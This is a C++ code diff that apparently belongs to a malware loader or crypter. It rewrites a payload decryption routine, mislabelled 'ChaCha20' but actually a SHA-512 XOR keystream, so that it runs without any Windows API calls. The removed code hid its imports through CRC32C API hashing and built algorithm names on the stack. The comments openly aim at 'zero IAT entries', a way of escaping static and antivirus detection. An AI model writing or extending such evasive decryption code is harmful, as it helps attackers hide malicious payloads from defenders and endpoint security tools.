@@ -10,6 +10,7 @@
 
 #include "Crypto.h"
 #include "ApiResolver.h"
+#include "PureCrypto.h"
 #include <bcrypt.h>     // Type definitions only — no IAT entries (pragma lib removed)
 
 namespace Crypto
@@ -162,113 +163,38 @@ namespace Crypto
         }
 
         // ═══ ChaCha20 (SHA-512 PRNG stream, matches C# DeriveKeyStream) ═══
-        // All BCrypt* + Heap* calls resolved via CRC32C hash — zero IAT entries
+        // Pure C++ SHA-512 via PureCrypto — zero WinAPI calls, zero IAT entries
         void DecryptChaCha20(unsigned char* data, size_t size, const unsigned char* key, size_t keySize)
         {
-            HMODULE hBC = GetBCryptModule();
-            if (!hBC)
-            {
-                DecryptXOR(data, size, key, keySize);
-                return;
-            }
-
-            auto pOpenAlg     = (NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE*,LPCWSTR,LPCWSTR,ULONG))
-                Api::GetProcByHashCrc(hBC, HASH_BCryptOpenAlgorithmProvider);
-            auto pCreateHash  = (NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE,BCRYPT_HASH_HANDLE*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG))
-                Api::GetProcByHashCrc(hBC, HASH_BCryptCreateHash);
-            auto pHashData    = (NTSTATUS(WINAPI*)(BCRYPT_HASH_HANDLE,PUCHAR,ULONG,ULONG))
-                Api::GetProcByHashCrc(hBC, HASH_BCryptHashData);
-            auto pFinishHash  = (NTSTATUS(WINAPI*)(BCRYPT_HASH_HANDLE,PUCHAR,ULONG,ULONG))
-                Api::GetProcByHashCrc(hBC, HASH_BCryptFinishHash);
-            auto pDestroyHash = (NTSTATUS(WINAPI*)(BCRYPT_HASH_HANDLE))
-                Api::GetProcByHashCrc(hBC, HASH_BCryptDestroyHash);
-            auto pCloseAlg    = (NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE,ULONG))
-                Api::GetProcByHashCrc(hBC, HASH_BCryptCloseAlgorithmProvider);
-
-            if (!pOpenAlg || !pCreateHash || !pHashData || !pFinishHash || !pDestroyHash || !pCloseAlg)
-            {
-                DecryptXOR(data, size, key, keySize);
-                return;
-            }
-
-            // Resolve HeapAlloc/HeapFree/GetProcessHeap from kernel32
-            HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
-            if (!hK32)
-            {
-                DecryptXOR(data, size, key, keySize);
-                return;
-            }
-            auto pGPH = (HANDLE(WINAPI*)())Api::GetProcByHashCrc(hK32, Api::CrcFn::GetProcessHeap);
-            auto pHA  = (PVOID(WINAPI*)(HANDLE,DWORD,SIZE_T))Api::GetProcByHashCrc(hK32, Api::CrcFn::HeapAlloc);
-            auto pHF  = (BOOL(WINAPI*)(HANDLE,DWORD,PVOID))Api::GetProcByHashCrc(hK32, Api::CrcFn::HeapFree);
-
-            if (!pGPH || !pHA || !pHF)
-            {
-                DecryptXOR(data, size, key, keySize);
-                return;
-            }
-
-            // Stack-built algorithm identifier
-            wchar_t sha512Alg[] = { 'S','H','A','5','1','2', 0 };
-
-            BCRYPT_ALG_HANDLE hAlg = NULL;
-            if (pOpenAlg(&hAlg, sha512Alg, NULL, 0) != 0)
-            {
-                DecryptXOR(data, size, key, keySize);
-                return;
-            }
-
-            unsigned char block[64]; // SHA-512 output
-            size_t blockSize = keySize < 64 ? keySize : 64;
-
-            // Initialize block with key
-            memcpy(block, key, keySize < 64 ? keySize : 64);
+            unsigned char block[64];
+            int blockSize = (int)(keySize < 64 ? keySize : 64);
+            memcpy(block, key, blockSize);
 
             size_t offset = 0;
             int counter = 0;
 
-            HANDLE hHeap = pGPH();
-
             while (offset < size)
             {
-                // Build input: block + counter (little-endian)
-                size_t inputLen = blockSize + 4;
-                unsigned char* dynInput = (unsigned char*)pHA(hHeap, 0, inputLen);
-                if (!dynInput) break;
-
-                memcpy(dynInput, block, blockSize);
-                // Append counter as 4 LE bytes
-                dynInput[blockSize + 0] = (unsigned char)(counter & 0xFF);
-                dynInput[blockSize + 1] = (unsigned char)((counter >> 8) & 0xFF);
-                dynInput[blockSize + 2] = (unsigned char)((counter >> 16) & 0xFF);
-                dynInput[blockSize + 3] = (unsigned char)((counter >> 24) & 0xFF);
+                unsigned char input[68];
+                memcpy(input, block, blockSize);
+                input[blockSize + 0] = (unsigned char)(counter & 0xFF);
+                input[blockSize + 1] = (unsigned char)((counter >> 8) & 0xFF);
+                input[blockSize + 2] = (unsigned char)((counter >> 16) & 0xFF);
+                input[blockSize + 3] = (unsigned char)((counter >> 24) & 0xFF);
                 counter++;
 
-                // Hash
-                BCRYPT_HASH_HANDLE hHash = NULL;
                 unsigned char hash[64];
-                ULONG hashLen = 64;
+                PureCrypto::Sha512(input, blockSize + 4, hash);
 
-                pCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0);
-                pHashData(hHash, dynInput, (ULONG)inputLen, 0);
-                pFinishHash(hHash, hash, hashLen, 0);
-                pDestroyHash(hHash);
-
-                pHF(hHeap, 0, dynInput);
-
-                // XOR data with hash stream
-                size_t toCopy = (hashLen < (size - offset)) ? hashLen : (size - offset);
+                size_t toCopy = (64 < (size - offset)) ? 64 : (size - offset);
                 for (size_t i = 0; i < toCopy; i++)
                     data[offset + i] ^= hash[i];
 
                 offset += toCopy;
 
-                // Next block = this hash (matches C# `block = hash`)
                 memcpy(block, hash, 64);
                 blockSize = 64;
             }
-
-            pCloseAlg(hAlg, 0);
         }
 
         // ═══ RC4 (symmetric - same op for encrypt/decrypt) ═══
